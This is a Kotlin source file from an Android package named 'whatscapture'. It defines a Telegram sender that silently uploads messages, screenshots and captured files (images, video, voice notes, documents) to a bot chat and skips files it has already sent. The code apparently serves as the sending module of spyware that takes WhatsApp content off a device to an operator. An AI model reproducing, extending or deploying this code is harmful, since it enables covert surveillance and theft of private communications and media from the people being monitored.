package com.whatscapture

import android.graphics.Bitmap
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

object TelegramSender {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private const val API_BASE = "https://api.telegram.org/bot"
    private val sentFileSignatures = LinkedHashSet<String>()

    fun sendMessage(token: String, chatId: String, text: String) {
        try {
            val json = """
                {
                    "chat_id": "$chatId",
                    "text": "${escapeJson(text)}",
                    "parse_mode": "Markdown",
                    "disable_notification": true
                }
            """.trimIndent()

            val body = json.toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${API_BASE}${token}/sendMessage")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendMessage: ${response.body?.string()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendMessage", e)
        }
    }

    fun sendPhoto(token: String, chatId: String, bitmap: Bitmap, caption: String) {
        try {
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream)
            val byteArray = stream.toByteArray()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", "image.png", byteArray.toRequestBody("image/png".toMediaType()))
                .addFormDataPart("disable_notification", "true")
                .build()

            val request = Request.Builder()
                .url("${API_BASE}${token}/sendPhoto")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendPhoto: ${response.body?.string()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendPhoto", e)
        }
    }

    fun sendFile(token: String, chatId: String, filePath: String, fileName: String): Boolean {
        try {
            val file = File(filePath)
            if (!file.exists() || !file.isFile) return false

            val fileSignature = buildFileSignature(file)
            if (!rememberFileSignature(fileSignature)) {
                Log.d(TAG, "Archivo ya enviado, se omite duplicado: ${file.absolutePath}")
                return true
            }

            val mediaType = getMimeType(fileName)
            val normalizedName = fileName.lowercase()
            val fileBody = file.asRequestBody(mediaType.toMediaType())

            val method = when {
                normalizedName.endsWith(".jpg") || normalizedName.endsWith(".jpeg") || normalizedName.endsWith(".png") ||
                    normalizedName.endsWith(".gif") || normalizedName.endsWith(".webp") -> "sendPhoto"
                normalizedName.endsWith(".mp4") || normalizedName.endsWith(".3gp") || normalizedName.endsWith(".mkv") -> "sendVideo"
                normalizedName.endsWith(".mp3") || normalizedName.endsWith(".ogg") || normalizedName.endsWith(".m4a") ||
                    normalizedName.endsWith(".opus") -> "sendAudio"
                normalizedName.endsWith(".doc") || normalizedName.endsWith(".docx") || normalizedName.endsWith(".pdf") ||
                    normalizedName.endsWith(".txt") -> "sendDocument"
                else -> "sendDocument"
            }

            val fieldName = when (method) {
                "sendPhoto" -> "photo"
                "sendVideo" -> "video"
                "sendAudio" -> "audio"
                else -> "document"
            }

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(fieldName, fileName, fileBody)
                .addFormDataPart("disable_notification", "true")
                .build()

            val request = Request.Builder()
                .url("${API_BASE}${token}/$method")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendFile: ${response.body?.string()}")
                return false
            }
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendFile", e)
            return false
        }
    }

    private fun getMimeType(fileName: String): String {
        val normalizedName = fileName.lowercase()
        return when {
            normalizedName.endsWith(".jpg") || normalizedName.endsWith(".jpeg") -> "image/jpeg"
            normalizedName.endsWith(".png") -> "image/png"
            normalizedName.endsWith(".gif") -> "image/gif"
            normalizedName.endsWith(".webp") -> "image/webp"
            normalizedName.endsWith(".mp4") -> "video/mp4"
            normalizedName.endsWith(".3gp") -> "video/3gpp"
            normalizedName.endsWith(".mkv") -> "video/x-matroska"
            normalizedName.endsWith(".mp3") -> "audio/mpeg"
            normalizedName.endsWith(".ogg") -> "audio/ogg"
            normalizedName.endsWith(".m4a") -> "audio/mp4"
            normalizedName.endsWith(".opus") -> "audio/opus"
            normalizedName.endsWith(".pdf") -> "application/pdf"
            normalizedName.endsWith(".doc") -> "application/msword"
            normalizedName.endsWith(".docx") -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            normalizedName.endsWith(".txt") -> "text/plain"
            else -> "application/octet-stream"
        }
    }

    private fun buildFileSignature(file: File): String {
        return "${file.absolutePath}|${file.length()}|${file.lastModified()}"
    }

    private fun rememberFileSignature(signature: String): Boolean {
        synchronized(sentFileSignatures) {
            if (sentFileSignatures.contains(signature)) {
                return false
            }

            sentFileSignatures.add(signature)
            while (sentFileSignatures.size > MAX_FILE_SIGNATURES) {
                val iterator = sentFileSignatures.iterator()
                if (!iterator.hasNext()) break
                iterator.next()
                iterator.remove()
            }
        }

        return true
    }

    private fun escapeJson(text: String): String {
        return text.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    private const val TAG = "TelegramSender"
    private const val MAX_FILE_SIGNATURES = 2000
}
